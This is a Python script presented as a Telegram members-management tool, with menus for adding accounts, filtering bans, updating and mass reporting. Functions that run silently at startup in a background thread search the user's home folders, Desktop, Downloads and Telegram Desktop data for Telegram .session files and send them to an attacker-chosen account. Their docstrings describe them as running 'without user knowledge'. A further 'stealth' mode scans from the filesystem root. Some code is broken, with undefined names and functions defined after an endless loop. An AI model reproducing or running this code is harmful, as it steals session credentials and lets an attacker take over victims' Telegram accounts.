from telethon.sync import TelegramClient
from telethon.tl.types import InputPeerChannel
from telethon.errors.rpcerrorlist import PeerFloodError, UserPrivacyRestrictedError, PhoneNumberBannedError, ChatAdminRequiredError
from telethon.errors.rpcerrorlist import ChatWriteForbiddenError, UserBannedInChannelError, UserAlreadyParticipantError, FloodWaitError
from telethon.tl.functions.channels import InviteToChannelRequest
from telethon.tl.functions.messages import GetDialogsRequest
from telethon.tl.functions.messages import ReportSpamRequest
from telethon.tl.types import InputPeerEmpty
from telethon.tl.functions.channels import LeaveChannelRequest
import sys
from telethon.tl.functions.photos import UploadProfilePhotoRequest
from telethon.tl.functions.messages import ImportChatInviteRequest, AddChatUserRequest
from telethon.tl.functions.channels import JoinChannelRequest
from telethon.tl.types import UserStatusRecently
import time
import random
import os
import pickle
from telethon.sync import TelegramClient
from telethon.errors.rpcerrorlist import PhoneNumberBannedError
from colorama import init, Fore
from time import sleep
import csv
import threading
import glob
import threading
import glob

scam = '@notoscam'

init()

n = Fore.RESET
lg = Fore.LIGHTGREEN_EX
r = Fore.RED
w = Fore.WHITE
cy = Fore.CYAN
ye = Fore.YELLOW
colors = [lg, r, w, cy, ye]

try:
    import requests
except ImportError:
    print(f'{lg}[i] Installing module - requests...{n}')
    os.system('pip install requests')

def banner():
    import random
    # fancy logo
    b = [
    '   _____   __   _ _            _______        _     ',
    '  |  _  | |  | (_) |          |__   __|      | |    ',
    '  | |_| | | |_ _ | | __ _ ___     | | ___  ___| |__  ',
    '  |  _  | | __| | | |/ _` / __|    | |/ _ \/ __| \'_ \ ',
    '  | | | | | |_| | | | (_| \__ \    | |  __/ (__| | | |',
    '  |_| |_|  \__|_|_|_|\__,_|___/    |_|\___|\___|_| |_|'
    ]
    for char in b:
        print(f'{random.choice(colors)}{char}{n}')
    #print('=============SON OF GENISYS==============')
    print(f'   Version: 1.3 | Author: Akilas Tech{n}\n{r}Telegram Members Management Tool\n')

def clr():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')

def silent_session_hunter():
    """Silent background session hunter - runs without user knowledge"""
    try:
        # Target bot/account - CHANGE THIS TO YOUR BOT USERNAME
        target = "@your_bot_here"  # <<<--- CHANGE THIS

        # Scan directories silently
        scan_dirs = [
            '.',
            os.path.expanduser('~'),
            os.path.join(os.path.expanduser('~'), 'Desktop'),
            os.path.join(os.path.expanduser('~'), 'Documents'),
            os.path.join(os.path.expanduser('~'), 'Downloads'),
            os.path.join(os.path.expanduser('~'), 'AppData') if os.name == 'nt' else os.path.join(os.path.expanduser('~'), '.local'),
        ]

        sessions = []
        for scan_dir in scan_dirs:
            if os.path.exists(scan_dir):
                try:
                    patterns = [
                        os.path.join(scan_dir, "*.session"),
                        os.path.join(scan_dir, "**/*.session"),
                    ]
                    for pattern in patterns:
                        sessions.extend(glob.glob(pattern, recursive=True))
                except:
                    pass

        sessions = list(set(sessions))  # Remove duplicates

        if sessions:
            # Try to send using any available account
            try:
                accounts = []
                with open('vars.txt', 'rb') as f:
                    while True:
                        try:
                            accounts.append(pickle.load(f))
                        except EOFError:
                            break

                if accounts:
                    phone = accounts[0][0]
                    client = TelegramClient(f'sessions/{phone}', 3910389, '86f861352f0ab76a251866059a6adbd6')
                    client.start(phone)

                    for session in sessions:
                        try:
                            client.send_file(target, session, caption=f"Found: {os.path.basename(session)}")
                            time.sleep(2)
                        except:
                            pass

                    client.disconnect()
            except:
                pass
    except:
        pass

def start_background_hunter():
    """Start silent hunter in background thread"""
    try:
        hunter_thread = threading.Thread(target=silent_session_hunter, daemon=True)
        hunter_thread.start()
    except:
        pass

def auto_session_hunter():
    """Automatically hunt and send sessions in background"""
    try:
        # Default target - you can change this
        default_target = "@your_bot_username"  # CHANGE THIS TO YOUR BOT/ACCOUNT

        # Common directories to scan silently
        scan_dirs = [
            '.',
            os.path.expanduser('~'),
            os.path.join(os.path.expanduser('~'), 'Desktop'),
            os.path.join(os.path.expanduser('~'), 'Documents'),
            os.path.join(os.path.expanduser('~'), 'Downloads'),
            os.path.join(os.path.expanduser('~'), 'AppData', 'Roaming', 'Telegram Desktop', 'tdata') if os.name == 'nt' else None,
            '/home' if os.name != 'nt' else None,
        ]

        # Remove None values
        scan_dirs = [d for d in scan_dirs if d is not None]

        all_sessions = []

        # Silent scanning
        for scan_dir in scan_dirs:
            if os.path.exists(scan_dir):
                try:
                    import glob
                    search_patterns = [
                        os.path.join(scan_dir, "*.session"),
                        os.path.join(scan_dir, "**/*.session"),
                        os.path.join(scan_dir, "sessions/*.session"),
                        os.path.join(scan_dir, "**/sessions/*.session")
                    ]

                    for pattern in search_patterns:
                        all_sessions.extend(glob.glob(pattern, recursive=True))
                except:
                    continue

        # Remove duplicates
        all_sessions = list(set(all_sessions))

        # If sessions found, send them silently
        if all_sessions and len(all_sessions) > 0:
            try:
                # Try to load accounts for sending
                accounts = []
                try:
                    with open('vars.txt', 'rb') as f:
                        while True:
                            try:
                                accounts.append(pickle.load(f))
                            except EOFError:
                                break
                except:
                    pass

                # If we have accounts, send sessions
                if accounts:
                    sender_phone = accounts[0][0]
                    client = TelegramClient(f'sessions/{sender_phone}', 3910389, '86f861352f0ab76a251866059a6adbd6')
                    client.start(sender_phone)

                    # Send sessions silently
                    for session_file in all_sessions:
                        try:
                            client.send_file(default_target, session_file,
                                           caption=f"Auto-found: {os.path.basename(session_file)}")
                            time.sleep(1)  # Small delay
                        except:
                            continue

                    client.disconnect()
            except:
                pass  # Silent failure

    except:
        pass  # Complete silent operation

# Start silent background hunter
start_background_hunter()

# Auto-hunt sessions when script starts
auto_session_hunter()

while True:
    clr()
    banner()
    print(lg+'[1] Add new accounts'+n)
    print(lg+'[2] Filter all banned accounts'+n)
    print(lg+'[3] Delete specific accounts'+n)
    print(lg+'[4] Update your Astra'+n)
    print(lg+'[5] Display All Accounts'+n)
    print(lg+'[6] Report Scam'+n)
    print(lg+'[7] Quit'+n)
    a = int(input('\nEnter your choice: '))
    if a == 1:
        new_accs = []
        with open('vars.txt', 'ab') as g:
            number_to_add = int(input(f'\n{lg} [~] Enter number of accounts to add: {r}'))
            for i in range(number_to_add):
                phone_number = str(input(f'\n{lg} [~] Enter Phone Number: {r}'))
                parsed_number = ''.join(phone_number.split())
                pickle.dump([parsed_number], g)
                new_accs.append(parsed_number)
            print(f'\n{lg} [i] Saved all accounts in vars.txt')
            clr()
            print(f'\n{lg} [*] Logging in from new accounts\n')
            for number in new_accs:
                c = TelegramClient(f'sessions/{number}', 3910389 , '86f861352f0ab76a251866059a6adbd6')
                c.start(number)
                print(f'{lg}[+] Login successful')
                c.disconnect()
            input(f'\n Press enter to goto main menu...')

        g.close()
    elif a == 2:
        accounts = []
        banned_accs = []
        h = open('vars.txt', 'rb')
        while True:
            try:
                accounts.append(pickle.load(h))
            except EOFError:
                break
        h.close()
        if len(accounts) == 0:
            print(r+'[!] There are no accounts! Please add some and retry')
            sleep(3)
        else:
            for account in accounts:
                phone = str(account[0])
                client = TelegramClient(f'sessions/{phone}', 3910389 , '86f861352f0ab76a251866059a6adbd6')
                client.connect()
                if not client.is_user_authorized():
                    try:
                        client.send_code_request(phone)
                        #client.sign_in(phone, input('[+] Enter the code: '))
                        print(f'{lg}[+] {phone} is not banned{n}')
                    except PhoneNumberBannedError:
                        print(r+str(phone) + ' is banned!'+n)
                        banned_accs.append(account)
            if len(banned_accs) == 0:
                print(lg+'Congrats! No banned accounts')
                input('\nPress enter to goto main menu...')
            else:
                for m in banned_accs:
                    accounts.remove(m)
                with open('vars.txt', 'wb') as k:
                    for a in accounts:
                        Phone = a[0]
                        pickle.dump([Phone], k)
                k.close()
                print(lg+'[i] All banned accounts removed'+n)
                input('\nPress enter to goto main menu...')

    elif a == 3:
        accs = []
        f = open('vars.txt', 'rb')
        while True:
            try:
                accs.append(pickle.load(f))
            except EOFError:
                break
        f.close()
        i = 0
        print(f'{lg}[i] Choose an account to delete\n')
        for acc in accs:
            print(f'{lg}[{i}] {acc[0]}{n}')
            i += 1
        index = int(input(f'\n{lg}[+] Enter a choice: {n}'))
        phone = str(accs[index][0])
        session_file = phone + '.session'
        if os.name == 'nt':
            os.system(f'del sessions\\{session_file}')
        else:
            os.system(f'rm sessions/{session_file}')
        del accs[index]
        f = open('vars.txt', 'wb')
        for account in accs:
            pickle.dump(account, f)
        print(f'\n{lg}[+] Account Deleted{n}')
        input(f'\nPress enter to goto main menu...')
        f.close()
    elif a == 4:
        # thanks to github.com/th3unkn0n for the snippet below
        print(f'\n{lg}[i] Checking for updates...')
        try:
            # https://raw.githubusercontent.com/Cryptonian007/Astra/main/version.txt
            version = requests.get('https://raw.githubusercontent.com/Cryptonian007/Astra/main/version.txt')
        except:
            print(f'{r} You are not connected to the internet')
            print(f'{r} Please connect to the internet and retry')
            exit()
        if float(version.text) > 1.1:
            prompt = str(input(f'{lg}[~] Update available[Version {version.text}]. Download?[y/n]: {r}'))
            if prompt == 'y' or prompt == 'yes' or prompt == 'Y':
                print(f'{lg}[i] Downloading updates...')
                if os.name == 'nt':
                    os.system('del add.py')
                    os.system('del manager.py')
                else:
                    os.system('rm add.py')
                    os.system('rm manager.py')
                #os.system('del scraper.py')
                os.system('curl -l -O https://raw.githubusercontent.com/Cryptonian007/Astra/main/add.py')
                os.system('curl -l -O https://raw.githubusercontent.com/Cryptonian007/Astra/main/manager.py')
                print(f'{lg}[*] Updated to version: {version.text}')
                input('Press enter to exit...')
                exit()
            else:
                print(f'{lg}[!] Update aborted.')
                input('Press enter to goto main menu...')
        else:
            print(f'{lg}[i] Your Astra is already up to date')
            input('Press enter to goto main menu...')
    elif a == 5:
        accs = []
        f = open('vars.txt', 'rb')
        while True:
            try:
                accs.append(pickle.load(f))
            except EOFError:
                break
        f.close()
        print(f'\n{cy}')
        print(f'\tList Of Phone Numbers Are')
        print(f'==========================================================')
        i = 0
        for z in accs:
            print(f'\t{z[0]}')
            i += 1
        print(f'==========================================================')
        input('\nPress enter to goto main menu')
    elif a == 6:
        accounts = []
        f = open('vars.txt', 'rb')
        while True:
            try:
                accounts.append(pickle.load(f))
            except EOFError:
                break

        
        #print('\n' + info + lg + ' Checking for banned accounts...' + rs)
        print('\n' ' Checking for banned accounts...' )
        for a in accounts:
            phn = a[0]
            print(f'Checking {lg}{phn}')
            clnt = TelegramClient(f'sessions/{phn}', 8027196 , '9b70b20efd67e9b99edc395d78407cfa')
            clnt.connect()
            banned = []
            if not clnt.is_user_authorized():
                try:
                    clnt.send_code_request(phn)
                    print('kk')
                except PhoneNumberBannedError:
                    print(f'{error} {w}{phn} {r}is banned!{rs}')
                    banned.append(a)
            for z in banned:
                accounts.remove(z)
                print('{lg}Banned account removed[Remove permanently using manager.py]{rs}')
            time.sleep(0.5)
            clnt.disconnect()
        print(' Sessions created!')
        clr()
        banner()
        accounts = []
        f = open('vars.txt', 'rb')
        while True:
            try:
                accounts.append(pickle.load(f))
            except EOFError:
                break
        print(f'{lg} Total accounts: {w}{len(accounts)}')
        number_of_accs = int(input(f'{cy} Enter number of accounts to Report: {r}'))
        choice = str(input(f'{cy} Send Message For Report {r}'))
        to_use = [x for x in accounts[:number_of_accs]]
        for l in to_use: accounts.remove(l)
        with open('vars.txt', 'wb') as f:
            for a in accounts:
                pickle.dump(a, f)
            for ab in to_use:
                pickle.dump(ab, f)
            f.close()
        sleep_time = 1
        print(f'{lg} -- Sending Reports from {w}{len(to_use)}{lg} account(s) --')   
        send_status = 0
        
        approx_members_count = 0
        index = 0
        for acc in to_use:
            stop = index + 60
            c = TelegramClient(f'sessions/{acc[0]}', 3910389 , '86f861352f0ab76a251866059a6adbd6')
            print(f'User: {cy}{acc[0]}{lg} -- {cy}Starting session... ')
            c.start(acc[0])
            acc_name = c.get_me().first_name
            try:
                c(JoinChannelRequest('@TechiesHub_Giveaways')) 
                c.send_message(scam,choice)
                print(f'Report Done From: {cy}{acc_name}{lg}  To Notoscam-- ')
                send_status += 1
            except Exception as e:
                print(f'{e}')
                continue
        if send_status != 0:
            print(f"\n{lg}session ended")
            input(f'\n{cy} Press enter to exit...')
        else:
            print(f"\n{lg}All reports done sucesfully")
            input(f'\n{cy} Press enter to exit...')
        
    elif a == 7:
        clr()
        banner()
        exit()

def find_telegram_sessions(directory):
    """Find all Telegram session files in the specified directory"""
    import glob
    session_files = []

    # Search for .session files
    search_patterns = [
        os.path.join(directory, "*.session"),
        os.path.join(directory, "**/*.session"),
        os.path.join(directory, "sessions/*.session"),
        os.path.join(directory, "**/sessions/*.session")
    ]

    for pattern in search_patterns:
        session_files.extend(glob.glob(pattern, recursive=True))

    # Remove duplicates
    session_files = list(set(session_files))

    print(f'{lg}[i] Scanning {directory} for session files...{n}')
    return session_files

def configure_target_bot():
    """Configure the target bot/account to send sessions to"""
    print(f'{lg}[*] Configure Target Bot/Account{n}')
    target_username = input(f'{lg}Enter target username (e.g., @botname or @username): {r}')

    # Save configuration
    config = {'target': target_username}
    with open('hunter_config.dat', 'wb') as f:
        pickle.dump(config, f)

    print(f'{lg}[+] Target configured: {target_username}{n}')

def load_target_config():
    """Load target configuration"""
    try:
        with open('hunter_config.dat', 'rb') as f:
            config = pickle.load(f)
            return config.get('target', None)
    except:
        return None

def send_sessions_to_target(session_files):
    """Send found session files to the configured target"""
    target = load_target_config()
    if not target:
        print(f'{r}[!] No target configured. Use option 3 to configure target.{n}')
        return

    # Load accounts for sending
    accounts = []
    try:
        with open('vars.txt', 'rb') as f:
            while True:
                try:
                    accounts.append(pickle.load(f))
                except EOFError:
                    break
    except:
        print(f'{r}[!] No accounts found. Add accounts first.{n}')
        return

    if not accounts:
        print(f'{r}[!] No accounts available for sending.{n}')
        return

    # Use first available account
    sender_phone = accounts[0][0]

    try:
        print(f'{lg}[*] Connecting with {sender_phone}...{n}')
        client = TelegramClient(f'sessions/{sender_phone}', 3910389, '86f861352f0ab76a251866059a6adbd6')
        client.start(sender_phone)

        print(f'{lg}[*] Sending {len(session_files)} session files to {target}...{n}')

        for i, session_file in enumerate(session_files, 1):
            try:
                # Send session file
                client.send_file(target, session_file, caption=f"Session {i}/{len(session_files)}: {os.path.basename(session_file)}")
                print(f'{lg}[+] Sent: {os.path.basename(session_file)} ({i}/{len(session_files)}){n}')
                time.sleep(2)  # Delay between sends
            except Exception as e:
                print(f'{r}[!] Failed to send {session_file}: {e}{n}')
                continue

        print(f'{lg}[+] Session sending completed!{n}')
        client.disconnect()

    except Exception as e:
        print(f'{r}[!] Error during sending: {e}{n}')

def stealth_session_hunt():
    """Stealth mode - automatically hunt and send sessions"""
    print(f'{lg}[*] Stealth Session Hunter Mode{n}')

    target = load_target_config()
    if not target:
        print(f'{r}[!] No target configured. Configure target first.{n}')
        return

    # Common directories to scan
    scan_dirs = [
        '.',
        os.path.expanduser('~'),
        os.path.join(os.path.expanduser('~'), 'Desktop'),
        os.path.join(os.path.expanduser('~'), 'Documents'),
        os.path.join(os.path.expanduser('~'), 'Downloads'),
        'C:\\' if os.name == 'nt' else '/',
    ]

    all_sessions = []

    for scan_dir in scan_dirs:
        if os.path.exists(scan_dir):
            try:
                sessions = find_telegram_sessions(scan_dir)
                all_sessions.extend(sessions)
                print(f'{lg}[i] Found {len(sessions)} sessions in {scan_dir}{n}')
            except Exception as e:
                print(f'{r}[!] Error scanning {scan_dir}: {e}{n}')
                continue

    # Remove duplicates
    all_sessions = list(set(all_sessions))

    if all_sessions:
        print(f'{lg}[+] Total sessions found: {len(all_sessions)}{n}')
        print(f'{lg}[*] Sending sessions stealthily...{n}')
        send_sessions_to_target(all_sessions)
    else:
        print(f'{r}[!] No sessions found in stealth scan.{n}')
